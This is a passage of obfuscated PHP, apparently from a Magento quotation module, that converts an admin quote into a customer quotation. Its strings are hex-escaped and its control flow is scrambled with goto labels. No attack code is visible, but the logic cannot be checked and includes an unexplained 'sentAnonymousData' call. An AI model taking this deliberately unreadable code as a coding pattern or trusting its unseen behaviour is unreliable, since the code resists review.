Mage::dispatchEvent("\161\x71\165\157\x74\145\141\144\x76\137\x71\161\x61\144\x76\x63\x75\x73\x74\157\x6d\145\x72\x5f\x62\145\146\x6f\x72\145\137\156\x65\x77\x43\165\163\164\157\155\145\x72", ["\143\x75\163\164\x6f\155\x65\x72" => $ZXeg2, "\161\165\157\x74\145" => $OLseV]); goto wRauy; kf4CK: } catch (Exception $Zf0h2) { goto I9CBi; I9CBi: $this->_redirectErr([$Zf0h2->getMessage()]); goto eXrvX; eXrvX: Mage::log("\x45\x78\x63\x65\x70\x74\x69\x6f\156\x3a\x20" . $Zf0h2->getMessage(), null, "\143\62\x71\x5f\x65\170\x63\x65\x70\164\151\x6f\x6e\56\154\157\x67", true); goto X4NkK; X4NkK: return; goto nDh6Y; nDh6Y: } goto ieTx0; m0uk0: $ZXeg2->setEmail($OLseV->getData("\x63\165\x73\x74\x6f\x6d\x65\x72\137\x65\x6d\141\151\x6c")); goto G_ysv; v1yGl: $OLseV->setCustomer($ZXeg2); goto ZuOBn; ZuOBn: } public function switch2QuoteAction() { $this->swith2QuoteAction(); } public function swith2QuoteAction() { goto u_hAm; wmMZd: xqETl: goto GzQ__; w0PH8: v_Fg_: goto cYvEs; Lg2f3: $BhWOR["\x63\165\x73\164\x6f\155\x65\x72\x5f\x67\x72\x6f\x75\x70\x5f\151\x64"] = $McJRc; goto digIi; ndv1b: $McJRc = $OLseV->getCustomer()->getData("\x67\x72\x6f\x75\160\x5f\151\x64"); goto uG3QN; D6XvN: $this->_redirect("\141\144\x6d\151\x6e\x68\164\155\x6c\x2f\161\161\165\x6f\x74\x65\x61\144\166\x2f\x65\x64\151\x74", ["\151\144" => $MYXly]); goto DSGJj; yE__s: TPznW: goto D6XvN; u_hAm: if (!Mage::helper("\161\x71\x75\157\164\145\141\144\x76\x2f\154\x69\143\x65\x6e\163\x65\x63\x68\x65\x63\153\163")->showFreeUserOptions()) { goto VqK52; } goto LCH00; a4U3u: $oGSWo = Mage::getModel("\x63\x75\x73\x74\x6f\x6d\x65\x72\57\143\165\x73\x74\157\x6d\145\x72")->load($EY6wb); goto jvFVF; Gmt_A: goto cP1Er; goto E7Wu6; vrbxo: $this->_redirect("\52\x2f\x2a"); goto XR8Yp; bA69N: foreach ($n10fj->getCollection()->addFieldToFilter("\161\x75\157\164\145\x5f\x69\x64", $MYXly) as $qugQe) { goto Zj96H; Wiq4v: Mage::getModel("\161\x71\x75\157\x74\x65\141\x64\x76\x2f\x71\161\x61\x64\x76\x70\162\x6f\144\x75\143\164")->deleteQuote($qugQe->getId()); goto kn2nB; waxSd: if (!$xh9fN) { goto EkM3f; } goto Wiq4v; KRjTc: foreach ($glYn3 as $vuQ04) { goto jKlgR; qWBBp: aFCNY: goto TOFzz; yKC8r: Qjqbc: goto qWBBp; jKlgR: if (!($vuQ04 == $qugQe->getId())) { goto Qjqbc; } goto RPuEi; RPuEi: $xh9fN = false; goto P9vcO; P9vcO: goto pBBku; goto yKC8r; TOFzz: } goto l1UI4; kn2nB: EkM3f: goto ig4Um; ig4Um: pZi2d: goto ePTxW; Zj96H: $xh9fN = true; goto KRjTc; l1UI4: pBBku: goto waxSd; ePTxW: } goto kpFpI; WgTRx: $sPCw3 = $VpbLO->addCustomerAddress($EY6wb, $qLNg0->exportCustomerAddress()->getData()); goto YEWAu; TCv4I: foreach ($Y5hXV as $i1eZt) { goto EeZIH; j8vkG: tL7bV: goto tDj5u; VPtxJ: $BhWOR["\163\150\x69\160\x70\x69\156\x67\x5f" . $i1eZt] = $DfAxy->getData($i1eZt); goto j8vkG; EeZIH: if (!($i1eZt != "\141\x64\x64\x72\145\x73\x73")) { goto tL7bV; } goto Fep0V; Fep0V: $BhWOR[$i1eZt] = $qLNg0->getData($i1eZt); goto VPtxJ; tDj5u: w2J6L: goto b2Q_F; b2Q_F: } goto FShnB; GC7v1: I_JKG: goto Gr2AX; SBAkt: foreach ($Qg6y7 as $i1eZt => $bxgBR) { $YygQt[$i1eZt] = $mdGp7[$bxgBR]; vcLEY: } goto eIxey; Y3_iK: $f6WCT = $sPCw3->getEntityId(); goto j_Jwy; bgG4i: if (!($fw9he == 507/507)) { goto Nzj2k; } goto cMOi1; MbhTd: awd7f: goto LCsVI; wBtWt: focPe: goto ndv1b; Dazk4: try { goto VioRv; CwMX4: $Yai3_->setIncrementId(Mage::getModel("\161\161\x75\x6f\164\145\141\144\x76\57\145\x6e\x74\151\x74\171\x5f\151\156\143\x72\145\x6d\x65\156\x74\137\156\165\x6d\x65\x72\x69\x63")->getNextId($Yai3_->getStoreId())); goto p1aBS; L0j7w: if (!(isset($xOx3u["\x70\141\171\x6d\145\156\164"]) && isset($xOx3u["\160\141\171\155\x65\x6e\x74"]["\155\145\x74\150\x6f\144"]))) { goto ae17g; } goto t8FPP; LEN6o: goto DOQMA; goto tL7KS; MRs08: Mage::dispatchEvent("\x71\161\165\157\164\145\141\144\x76\137\x71\161\x61\144\x76\x63\165\163\164\157\x6d\x65\162\137\x62\145\x66\x6f\162\145\163\141\x76\x65\x5f\x66\x69\x6e\141\154", ["\161\x75\x6f\164\x65" => $Yai3_]); goto vohiY; AXg9M: $Yai3_->setData("\x77\x65\x69\147\x68\164", $DfAxy->getWeight()); goto BN7xC; BN7xC: Xw0WZ: goto L0j7w; vohiY: $Yai3_->save(); goto VIWwy; uP4Z3: $GC1Re = null; goto PF46g; MlTlP: DOQMA: goto o5Ymp; VIWwy: Mage::dispatchEvent("\x71\161\165\157\x74\145\x61\144\166\x5f\161\161\141\x64\x76\x63\165\163\164\x6f\155\x65\x72\x5f\x61\x66\164\145\x72\x73\x61\166\x65\137\146\x69\x6e\x61\154", ["\161\165\157\164\145" => $Yai3_]); goto ENTf2; t8FPP: $K_xyQ = $xOx3u["\160\x61\171\155\145\x6e\x74"]["\155\x65\x74\x68\x6f\144"]; goto Kbp_y; VioRv: $Yai3_->load($MYXly); goto ovuuv; rDpPi: if (Mage::getSingleton("\141\144\x6d\151\156\x68\164\155\x6c\57\x73\x65\x73\163\x69\x6f\156")->getUpdateQuoteId()) { goto pXZdp; } goto CwMX4; BFLH2: if (!($GC1Re != null)) { goto juK1n; } goto fFm0c; R2T5I: $JgdNj = $k9OLF[489/489]; goto MlTlP; p1aBS: $Yai3_->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_BEGIN); goto TbxPa; ovuuv: $Yai3_->setIsQuote(815/815); goto rDpPi; OZWgz: $Yai3_->setCreateHash(Mage::helper("\161\x71\x75\157\164\x65\141\x64\x76\57\x6c\151\143\x65\x6e\x73\x65")->getCreateHash($Yai3_->getIncrementId())); goto n8XpW; d0hfj: if (!$DfAxy->getShippingMethod()) { goto Xw0WZ; } goto JYGFV; ERmdh: ae17g: goto jxauz; jPbEy: if (isset($k9OLF[456/456])) { goto Uc4u3; } goto tG0TJ; ENTf2: Mage::helper("\x71\161\x75\157\164\145\141\x64\166\57\x6c\157\x67\x67\x69\156\x67")->sentAnonymousData("\162\145\161\165\x65\x73\x74", "\x62", $Yai3_->getData("\161\165\157\x74\145\x5f\x69\x64")); goto tgXu3; o5Ymp: $Yai3_->setData("\163\150\151\160\x70\151\156\x67\137\x6d\145\164\150\157\x64", $JgdNj); goto Q0HFJ; iQfeG: foreach ($MrOXb as $vvjpK) { goto EUSts; Li2se: iFZt6: goto qufcM; svCNw: $Yai3_->setData("\x73\150\151\x70\160\151\x6e\x67\137" . $vvjpK, $DfAxy->getData($vvjpK)); goto Li2se; EUSts: $Yai3_->setData($vvjpK, $qLNg0->getData($vvjpK)); goto svCNw; qufcM: } goto FuJjF; Kbp_y: $Yai3_->setPaymentMethod($K_xyQ); goto ERmdh; PF46g: if (!is_string($OLseV->getData("\141\160\160\x6c\151\145\x64\137\162\x75\154\145\x5f\x69\x64\163"))) { goto fqxpB; } goto LoKvg; LP1vs: Za7I3: goto d0hfj; JYGFV: $k9OLF = explode("\137", $DfAxy->getShippingMethod()); goto jPbEy; tfW6B: $Yai3_->setData($vvjpK, $DfAxy->getData("\163\x61\x6d\145\x5f\x61\163\137\x62\x69\154\154\151\x6e\x67")); goto LP1vs; WTuVw: $Yai3_->collectTotals(); goto MRs08; x5gAI: fqxpB: goto BFLH2; bmSMP: $Yai3_->setData("\141\x64\144\162\145\163\163\x5f\x73\x68\151\x70\160\x69\156\x67\137\x64\x65\x73\x63\162\151\x70\164\151\x6f\x6e", $DfAxy->getShippingDescription()); goto FNa5K; jxauz: $OLseV->getPayment(); goto NHjMZ; yVSVU: if (!($DfAxy->getData("\163\141\x6d\x65\137\141\x73\x5f\x62\151\x6c\154\x69\156\x67") && isset($vvjpK))) { goto Za7I3; } goto tfW6B; FNa5K: $Yai3_->setData("\x62\141\x73\x65\x5f\x73\150\151\x70\160\x69\x6e\147\137\141\155\157\165\156\x74", $DfAxy->getBaseShippingAmount()); goto AXg9M; af_2J: $Yai3_->setData("\141\x64\x64\x72\x65\163\x73\137\x73\150\151\x70\x70\151\x6e\147\137\x6d\x65\x74\x68\157\144", $DfAxy->getShippingMethod()); goto bmSMP; TbxPa: pXZdp: goto OZWgz; U5ZmJ: $Yai3_->setData("\163\150\151\x70\160\151\x6e\147\137\144\145\163\x63\x72\x69\x70\x74\x69\157\156", $DfAxy->getShippingDescription()); goto af_2J; h81gI: $Yai3_->updateAddress(); goto WTuVw; E1t_z: $MrOXb = ["\166\x61\x74\137\151\x64", "\166\x61\164\137\x69\x73\x5f\166\141\x6c\151\144", "\x76\141\x74\x5f\162\x65\161\165\145\x73\x74\137\151\144", "\166\141\x74\137\x72\x65\x71\165\145\x73\164\137\x64\x61\x74\145", "\x76\141\164\137\x72\x65\161\x75\x65\163\x74\137\163\165\x63\x63\145\163\x73"]; goto iQfeG; fFm0c: $Yai3_->setData("\x73\141\154\145\x73\162\165\154\x65", $OLseV->getData("\x61\160\x70\154\x69\x65\144\137\x72\x75\154\x65\137\151\x64\163")); goto IiJTu; IiJTu: juK1n: goto kaFzn; Q0HFJ: $Yai3_->setData("\x73\x68\151\x70\x70\x69\x6e\147\137\143\x6f\144\145", $DfAxy->getShippingMethod()); goto U5ZmJ; tL7KS: Uc4u3: goto R2T5I; FuJjF: bwBA8: goto yVSVU; NHjMZ: $Yai3_->getShippingAddress()->requestShippingRates(); goto h81gI; kaFzn: O38FO: goto E1t_z; LoKvg: $GC1Re = $OLseV->getData("\x63\x6f\x75\160\x6f\156\x5f\x63\157\144\145"); goto x5gAI; n8XpW: if (!$OLseV->getData("\x61\160\x70\154\151\145\144\x5f\162\x75\154\x65\137\151\x64\x73")) { goto O38FO; } goto uP4Z3; tG0TJ: $JgdNj = $DfAxy->getShippingMethod(); goto LEN6o; tgXu3: } catch (Exception $Zf0h2) { Mage::log("\105\x78\x63\145\x70\164\151\x6f\156\x3a\40" . $Zf0h2->getMessage(), null, "\x63\x32\161\x5f\145\x78\143\x65\160\164\x69\x6f\156\56\x6c\x6f\147", true); } goto RWMCd; E7Wu6: ntFKo: goto rBMHX; vy7oj: $fPGQT = ''; goto lNv3i; h0ySW: $DfAxy->setCustomerAddressId($f6WCT); goto XKNgo; zKkfS: foreach ($dbQ0c as $i1eZt) { $YygQt[$i1eZt] = $DfAxy->getData($i1eZt); nb7Xr: } goto mdRNX; g30Mc: Nzj2k: goto GC7v1; Mopp2: $aMYKO = $OLseV->getData("\x71\x75\x6f\x74\145\137\143\165\x72\162\145\156\143\171\137\x63\x6f\x64\145"); goto JOVlm; xElFf: $SJjwU = $o1wUm->getQuoteId(); goto qCnqH; taXW2: $Qg6y7 = []; goto Qrq8H; mdRNX: u2HJH: goto SBAkt; XPnIT: $HYkyg = []; goto TPcKr; Qrq8H: $mdGp7 = null; goto aNhsn; FShnB: k5hb3: goto c1Yt_; j_Jwy: if (!$f6WCT) { goto mUgqW; } goto h0ySW; Sjxjj: GI3n7: goto JVMx2; NdAYC: MT52a: goto wR9WD; xjiKk: $Y5hXV = Mage::helper("\x71\161\x75\x6f\x74\x65\141\x64\x76\x2f\x61\144\144\x72\x65\x73\163")->addressFieldsArray(); goto TCv4I; BCvAY: $PKkmf = $DfAxy->getCustomerAddressId() > 0 ? $DfAxy->getCustomerAddressId() : null; goto KNSS7; MMIIo: $lcvw3 = $OLseV->getCustomer()->getEmail(); goto WGXyh; udqSU: if (!($EY6wb && $lcvw3)) { goto HKj4H; } goto RbZSW; j4F2O: if (!count($HYkyg)) { goto d0gOS; } goto RSEal; OBLf9: if (!$J55L0) { goto EryIQ; } goto Hzr4Y; YZ9xf: $glYn3 = []; goto gavW3; oZYFZ: $fPGQT = implode(PHP_EOL, $DfAxy->getStreet()); goto eC78x; rk9kk: if (in_array($OLseV->getStoreId(), $WWmYh)) { goto GI3n7; } goto Dhs6C; Z3Qvf: $Qgehk = implode(PHP_EOL, $qLNg0->getStreet()); goto wBtWt; wR9WD: goto rKWda; goto w0PH8; Z5V6_: $HYkyg[] = $this->__("\124\150\145\x72\145\40\x77\x61\x73\40\x61\x6e\40\145\162\162\x6f\x72\54\40\142\145\x63\141\x75\163\145\40\x74\x68\145\x20\160\x72\157\144\x75\x63\164\40\x71\x75\x61\156\164\x69\164\151\145\163\x20\167\x65\162\145\x20\156\x6f\164\40\144\145\x66\151\156\145\144"); goto eG6n8; bIGq9: EryIQ: goto VEEn5; XR8Yp: goto aJKgY; goto yE__s; qCnqH: $dC40_ = $OLseV->getData("\x62\x61\x73\145\x5f\x74\157\x5f\x71\x75\x6f\x74\145\137\x72\141\x74\145"); goto Mopp2; mD7hd: $BhWOR = []; goto mIrbL; Wuu4n: if ($wL2m8 > 0 && $cvDox == 713/713) { goto qwYzk; } goto oSAce; JCuge: $HYkyg[] = $this->__("\103\x75\x73\x74\157\x6d\145\162\47\163\x20\145\x6d\141\x69\154\40\167\141\163\x20\x75\156\144\145\146\x69\x6e\145\x64"); goto gBceA; RSEal: $this->_redirectErr($HYkyg); goto N4_MA; Hzr4Y: $fPGQT = implode(PHP_EOL, $DfAxy->getStreet()); goto bIGq9; mIrbL: $BhWOR["\x63\165\162\x72\x65\x6e\143\171"] = $aMYKO; goto xjiKk; Dhs6C: $HYkyg[] = $this->__("\x54\150\145\x20\x73\145\x6c\x65\143\164\x65\144\x20\143\165\x73\164\x6f\x6d\145\162\x20\x69\163\x20\x6e\157\164\40\154\151\156\x6b\145\144\40\164\157\40\164\150\145\x20\143\165\x72\x72\x65\156\x74\x20\163\x74\157\162\145\54\x20\120\x6c\x65\x61\x73\145\x20\x73\145\x74\x20\47\x53\171\163\164\145\x6d\x3e\x43\x6f\156\146\x69\x67\165\162\x61\164\x69\157\x6e\76\103\x75\x73\164\157\x6d\x65\162\x73\76\103\165\x73\x74\157\155\x65\x72\40\103\x6f\156\x66\151\x67\x75\162\x61\164\x69\157\156\x3e\x41\x63\143\157\165\156\164\40\123\x68\141\x72\x69\x6e\x67\x20\117\x70\164\151\157\x6e\x73\x3e\123\x68\x61\162\x65\x20\103\x75\x73\164\157\x6d\145\162\x20\101\143\143\x6f\x75\156\164\x73\47\40\164\157\40\x67\154\x6f\x62\x61\154"); goto Sjxjj; DSGJj: aJKgY: goto AJ9Sc; digIi: $BhWOR["\143\x75\x73\x74\x6f\155\x65\x72\x5f\164\141\x78\137\x63\x6c\x61\x73\163\x5f\x69\144"] = $FLYS9; goto d2Qlz; ik8Zw: try { $Yai3_ = Mage::getModel("\x71\x71\x75\x6f\164\x65\141\x64\x76\57\161\161\x61\x64\166\x63\165\x73\x74\x6f\155\x65\x72")->updateQuote($MYXly, $BhWOR); $Yai3_->updateAddress(); } catch (Exception $Zf0h2) { Mage::log("\105\x78\143\145\x70\164\151\157\x6e\72\x20" . $Zf0h2->getMessage(), null, "\143\x32\x71\137\145\170\x63\x65\x70\x74\151\x6f\x6e\x2e\154\x6f\x67", true); } goto NdAYC; qEj6k: if ($GoVTG > 0 && $dVTc6 == 477/477) { goto macyt; } goto MlZjr; JVMx2: f1W50: goto Y1F20; EMj8y: $BhWOR["\x65\155\141\151\x6c"] = $lcvw3; goto haXv7; o6R16: $o1wUm = Mage::getSingleton("\141\144\x6d\x69\x6e\x68\164\155\154\x2f\x73\145\163\x73\x69\x6f\x6e\137\161\x75\157\x74\x65"); goto xElFf; WQoqC: QQTki: goto yuAuw; Bxvjv: goto Rpih_; goto MbhTd; UtXbV: SOO3y: goto ddM8J; c9InD: HKj4H: goto nNMks; A4kWF: $qLNg0->setCustomerAddressId($f6WCT); goto bgG4i; XKNgo: mUgqW: goto oRJBJ; aNhsn: foreach ($XPUx1 as $KadLV) { goto fKygA; j9pAG: W1Lsv: goto oINY7; v5y_B: $Qg6y7 = ["\163\150\x69\160\160\x69\x6e\147\137\x6d\145\x74\x68\157\144" => "\x6d\145\164\x68\x6f\x64", "\163\150\x69\x70\160\x69\156\147\137\x64\x65\x73\143\162\x69\x70\164\151\x6f\156" => "\x6d\x65\x74\150\x6f\144\137\144\145\163\x63\x72\151\x70\164\x69\157\156", "\163\x68\151\160\160\151\156\147\x5f\155\145\x74\150\x6f\x64\137\164\151\x74\154\x65" => "\x6d\x65\x74\150\x6f\x64\x5f\164\x69\x74\x6c\x65", "\x73\x68\x69\160\160\151\x6e\147\x5f\x63\141\x72\x72\x69\x65\162" => "\143\x61\162\162\x69\x65\x72", "\163\x68\x69\x70\160\151\156\147\137\143\141\162\162\x69\145\162\137\x74\x69\164\x6c\x65" => "\143\x61\162\162\151\x65\x72\x5f\x74\x69\x74\154\145", "\163\150\151\x70\x70\151\156\x67\137\143\x6f\144\145" => "\143\157\144\x65"]; goto lzhus; RL4Ty: t5XeF: goto j9pAG; fKygA: if (!($KadLV["\143\x6f\x64\145"] == $DfAxy->getShippingMethod())) { goto t5XeF; } goto zjncE; zjncE: $mdGp7 = $KadLV; goto v5y_B; lzhus: goto Db4El; goto RL4Ty; oINY7: } goto ACI_P; kpFpI: mS6Np: goto Dazk4; oRJBJ: goto iX6e9; goto PQtiZ; eu5Dj: mJoyA: goto akWro; ACI_P: Db4El: goto vy7oj; f6_RV: if (!$f6WCT) { goto I_JKG; } goto A4kWF; N4_MA: return; goto OF08r; tB1a5: $Yai3_->setData($YygQt); goto PgKKb; OF08r: d0gOS: goto udqSU; F7YcS: fUdbm: goto asPMi; EIAx2: $this->_redirectErr($HYkyg); goto y74Q8; nNMks: Mage::getSingleton("\141\144\155\x69\156\x68\164\x6d\x6c\x2f\163\145\x73\163\x69\157\x6e")->setUpdateQuoteId(null); goto SX8wf; eC78x: $QHHKe = implode(PHP_EOL, $qLNg0->getStreet()); goto mD7hd; bXeRW: if (!array_key_exists("\x67\162\x6f\165\160\137\151\x64", $xOx3u["\x6f\162\x64\145\x72"]["\141\143\x63\157\165\156\164"])) { goto SAX2z; } goto ZpHWp; h6yye: $MYXly = Mage::getSingleton("\x61\x64\155\151\156\x68\x74\x6d\154\x2f\x73\145\163\x73\x69\x6f\156")->getUpdateQuoteId(); goto XPnIT; eBSPf: AY2pV: goto Kc4w0; TF8qe: $DfAxy = $OLseV->getShippingAddress(); goto qNFHW; mawfH: $cvDox = $qLNg0->getData("\x73\x61\166\145\x5f\151\x6e\137\x61\144\144\162\x65\x73\163\x5f\142\x6f\157\153"); goto mgTVM; g5CFF: wCT3y: goto WgTRx; P36Um: Mage::dispatchEvent("\157\160\150\151\x72\x61\150\137\x71\161\165\x6f\164\145\141\144\166\137\141\144\155\151\x6e\137\x73\x77\151\164\x68\62\121\165\157\164\x65\x5f\x62\x65\x66\157\162\x65", [$MYXly, $OLseV, $xOx3u]); goto o6R16; PgKKb: $YygQt["\165\x73\145\162\x5f\x69\144"] = $r9mMO->getExpectedQuoteAdminId($Yai3_, $V63Tj->getUserId(), true); goto zKkfS; MlZjr: goto iX6e9; goto ad7e9; ad7e9: OCTgx: goto JmkBC; wVP49: $BhWOR["\163\x68\151\160\x70\x69\x6e\x67\x5f\145\x6d\x61\x69\154"] = $lcvw3; goto EMj8y; TPYqK: if (!array_key_exists("\141\143\143\x6f\165\156\x74", $xOx3u["\157\x72\144\x65\162"])) { goto vOWzo; } goto bXeRW; RWMCd: Mage::getSingleton("\141\x64\x6d\x69\x6e\x68\x74\x6d\154\57\163\x65\x73\163\x69\x6f\156\x5f\x71\165\x6f\x74\x65")->clear(); goto c9InD; Y32U1: if (!count($HYkyg)) { goto xqETl; } goto EIAx2; WxEgZ: qwYzk: goto OYRwi; Ab16F: $x09Vf = false; goto EhQT0; TN_sS: znlkl: goto yydcg; Gr2AX: goto SOO3y; goto WxEgZ; ukGbE: Cw4j1: goto bA69N; haXv7: $BhWOR["\143\162\x65\x61\164\145\144\x5f\146\162\157\x6d\x5f\x71\x75\x6f\164\x65\x5f\x69\x64"] = $SJjwU; goto Lg2f3; gBceA: Gm7ta: goto EWvzP; eIxey: uewrz: goto aZj47; UaqA6: if (!(!$EY6wb && $OLseV->getData("\x63\x75\x73\164\x6f\x6d\x65\162\x5f\145\155\141\x69\x6c"))) { goto znlkl; } goto qn_uL; WTprF: $BhWOR["\x73\x68\x69\x70\x70\151\156\147\x5f\x61\x64\x64\162\x65\163\x73"] = $fPGQT; goto wVP49; EhUBL: $QMteD = $qLNg0->getCustomerAddressId() > 0 ? $qLNg0->getCustomerAddressId() : null; goto BCvAY; oSAce: goto SOO3y; goto g5CFF; yp9kj: VqK52: goto h6yye; OgL3T: $naxnU = $OLseV->getAllItems(); goto CNzk8; ybvI7: $xOx3u = $this->getRequest()->getPost(); goto P36Um; ddM8J: if ($dVTc6 == 317/317 && $GoVTG == "\x30") { goto OCTgx; } goto qEj6k; TPcKr: $OLseV = Mage::getSingleton("\141\x64\155\151\x6e\150\164\155\x6c\57\163\145\163\x73\x69\x6f\156\137\x71\x75\157\164\x65")->getQuote(); goto ybvI7; WGXyh: goto mSdxZ; goto F7YcS; gavW3: $EHpPI = []; goto jAHzZ; YEWAu: $f6WCT = $sPCw3->getEntityId(); goto f6_RV; vQLZq: Zmw6z: goto OBLf9; DQc92: $VpbLO->updateCustomerAddress($EY6wb, $GoVTG, $DfAxy->exportCustomerAddress()->getData()); goto yYHga; Jhgpq: $BhWOR["\141\144\144\162\145\163\163"] = $QHHKe; goto WTprF; Kwv_x: $fw9he = $xOx3u["\x73\150\151\160\x70\151\x6e\147\137\x61\163\137\142\151\154\154\x69\x6e\147"]; goto KbYQg; ob0x7: if (!$MYXly) { goto v_Fg_; } goto V9gsu; XG4Un: SRqbT: goto Jhgpq; Kyp9K: rKWda: goto Y32U1; LK5ey: foreach ($DfAxy->getStreet() as $LgtKY) { goto gTgQc; MDrcX: jG69G: goto cQCY_; xJQay: SIrFb: goto MDrcX; lBM0h: $J55L0 = true; goto xJQay; gTgQc: if (!($LgtKY != '')) { goto SIrFb; } goto lBM0h; cQCY_: } goto sW9uk; mgTVM: $GoVTG = $OLseV->getShippingAddress()->getCustomerAddressId(); goto ukM11; GzQ__: $n10fj = Mage::getModel("\x71\161\x75\157\x74\x65\x61\x64\x76\x2f\161\161\x61\144\166\x70\x72\157\144\x75\143\x74"); goto YZ9xf; i4ArP: $WWmYh = $s7SOj->getStoreIds(); goto rk9kk; OZ1Qb: Rpih_: goto Kyp9K; PQtiZ: macyt: goto DQc92; aZj47: try { $MYXly = $Yai3_->addQuote($YygQt)->getQuoteId(); $this->getCustomerSession()->setQuoteadvId($MYXly); } catch (Exception $Zf0h2) { Mage::log("\105\170\x63\x65\160\x74\151\x6f\x6e\x3a\x20" . $Zf0h2->getMessage(), null, "\143\62\161\137\145\x78\143\x65\160\164\x69\157\x6e\56\x6c\x6f\147", true); } goto OZ1Qb; sW9uk: rA_nj: goto Ab16F; SX8wf: if ($MYXly) { goto TPznW; } goto vrbxo; UI6CG: if (!empty($lcvw3)) { goto Gm7ta; } goto JCuge; KeaYR: if ($woZGu != '') { goto awd7f; } goto N1pvU; JOVlm: $EY6wb = $OLseV->getCustomer()->getId(); goto UaqA6; d2Qlz: if (!(count($BhWOR) > 0)) { goto MT52a; } goto ik8Zw; gMyca: $s7SOj = Mage::getModel("\x63\x6f\162\x65\x2f\x77\x65\142\x73\x69\164\x65")->load($dEZQC); goto i4ArP; x9h2R: foreach ($naxnU as $QbRw5) { goto mdd0m; p6k5T: if (!($QbRw5->getData("\160\x72\x6f\144\165\x63\x74")->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE)) { goto nIT1V; } goto ZOn9j; U0RFa: if (!(isset($zjhFp) && $zjhFp->getHasErrors())) { goto TPpap; } goto q0bbh; P7USO: LSQYz: goto eUBvE; uLUsB: $hZzDN = $QbRw5->getData("\x71\164\x79"); goto Zc9UN; ovLuz: NglnN: goto EkvGR; b8jFH: $GT4Jc = []; goto nL1E_; qB6W2: $DCi4r = Mage::getModel("\161\x71\165\x6f\164\x65\x61\x64\x76\x2f\x71\161\x61\x64\x76\x70\x72\157\x64\165\x63\x74")->getBundleOptionProducts($QbRw5->getData("\x70\x72\157\x64\x75\x63\x74"), $k6ni8["\x69\156\146\157\137\x62\165\171\122\145\x71\165\x65\x73\164"]); goto wawxE; LhhYN: if ($YnapJ != false) { goto LSQYz; } goto uLUsB; mdd0m: $YnapJ = Mage::helper("\161\x71\x75\157\x74\145\x61\144\166")->isConfigurable($QbRw5, $QbRw5->getData("\x71\x74\x79")); goto LhhYN; g1Q6H: IOHYI: goto p6k5T; fnZkP: $HYkyg = array_merge($HYkyg, $hewCg); goto ESZB8; SMMAr: M_XN5: goto TCi2n; Zc9UN: goto IOHYI; goto P7USO; iKrYN: $GT4Jc = array_merge($GT4Jc, $DCi4r); goto ovLuz; q0bbh: $hewCg = $zjhFp->getErrors(); goto fnZkP; eUBvE: $hZzDN = $YnapJ; goto g1Q6H; qcnxt: $PHRyZ = $hZzDN; goto b8jFH; EkvGR: foreach ($GT4Jc as $zHD6H) { goto xRoFQ; cLyR4: foreach ($PHRyZ as $pnm92) { goto vrVsr; CPwCZ: goto noYxq; goto xq5yu; xq5yu: Cfuk2: goto jlPO3; vrVsr: $PHRyZ = $pnm92; goto CPwCZ; jlPO3: } goto oldgi; FLf5S: inNR6: goto cGlB0; xRoFQ: if (!($zHD6H->getId() == $QbRw5->getData("\160\162\157\144\165\143\x74")->getId())) { goto cH7a4; } goto rqGO0; rqGO0: if (!$zHD6H->getQuoteItemQty()) { goto inNR6; } goto VBF72; vejor: k7rWG: goto ug7bX; oldgi: noYxq: goto mVSzY; cGlB0: $zjhFp = Mage::helper("\161\x71\165\x6f\x74\x65\141\x64\166")->isQuoteable($QbRw5->getData("\160\x72\x6f\x64\x75\143\164"), $PHRyZ); goto obM31; obM31: cH7a4: goto vejor; ySbV0: if (!is_array($PHRyZ)) { goto cxBmy; } goto cLyR4; VBF72: $PHRyZ = $zHD6H->getQuoteItemQty(); goto ySbV0; mVSzY: cxBmy: goto FLf5S; ug7bX: } goto Eg3L0; VcBsh: if (!isset($DCi4r)) { goto NglnN; } goto iKrYN; Eg3L0: i0kBt: goto U0RFa; ESZB8: TPpap: goto SMMAr; ZOn9j: $k6ni8 = Mage::getModel("\161\x71\x75\x6f\x74\145\x61\144\166\x2f\x62\x75\156\x64\x6c\145")->getOrderOptions($QbRw5->getData("\x70\x72\x6f\144\x75\x63\x74")); goto qB6W2; nL1E_: $GT4Jc[] = $QbRw5->getData("\x70\162\157\144\x75\143\x74"); goto VcBsh; wawxE: nIT1V: goto qcnxt; TCi2n: } goto eu5Dj; wZ0Cx: $J55L0 = false; goto LK5ey; asPMi: try { goto p6feU; KqBMc: $ZXeg2->setEmail($lcvw3); goto JZB1k; YFi2z: $ZXeg2 = Mage::getModel("\x71\x71\x75\x6f\164\145\141\144\166\x2f\x63\165\163\x74\157\x6d\x65\x72\137\143\165\163\164\x6f\155\145\162"); goto pqWUV; p6feU: $lcvw3 = $OLseV->getData("\143\x75\163\x74\x6f\155\x65\x72\137\145\x6d\141\151\x6c"); goto YFi2z; JZB1k: Mage::dispatchEvent("\161\161\165\x6f\164\145\x61\x64\166\137\161\x71\x61\144\x76\143\x75\x73\x74\157\x6d\145\x72\x5f\142\145\146\x6f\x72\x65\137\x6e\145\x77\x43\165\x73\x74\157\155\x65\162", ["\143\165\163\x74\157\x6d\x65\x72" => $ZXeg2, "\161\165\157\x74\x65" => $OLseV]); goto cGPTY; Sg99n: $ZXeg2->sendNewQuoteAccountEmail("\162\x65\147\151\163\164\145\162\145\144", '', $ZXeg2->getStoreId()); goto BdbTO; cGPTY: $ZXeg2->save(); goto XWL0D; pqWUV: $ZXeg2->setData($OLseV->getCustomer()->getData()); goto KqBMc; XWL0D: Mage::dispatchEvent("\161\161\165\x6f\164\x65\141\x64\166\137\161\161\141\x64\166\x63\165\163\164\157\155\x65\x72\x5f\x61\x66\164\x65\x72\x5f\x6e\x65\x77\x43\x75\163\164\x6f\x6d\x65\162", ["\143\x75\163\164\157\x6d\x65\162" => $ZXeg2, "\x71\x75\157\x74\145" => $OLseV]); goto Sg99n; BdbTO: } catch (Exception $Zf0h2) { goto TiiJf; TiiJf: $this->_redirectErr([$Zf0h2->getMessage()]); goto LuIro; VbBO5: return; goto qUNqD; LuIro: Mage::log("\105\170\143\145\160\164\x69\157\156\x3a\40" . $Zf0h2->getMessage(), null, "\143\62\161\137\x65\x78\x63\145\x70\x74\151\157\156\56\154\x6f\x67", true); goto VbBO5; qUNqD: } goto aCUXZ; HjKu7: SAX2z: goto uJxgc; qNFHW: $wL2m8 = $OLseV->getBillingAddress()->getCustomerAddressId(); goto mawfH; ukM11: $dVTc6 = $DfAxy->getData("\163\141\166\x65\x5f\x69\x6e\137\141\x64\144\162\145\x73\163\137\x62\x6f\x6f\x6b"); goto Kwv_x; cYvEs: $woZGu = $qLNg0->getFirstname(); goto KeaYR; Kc4w0: $FLYS9 = 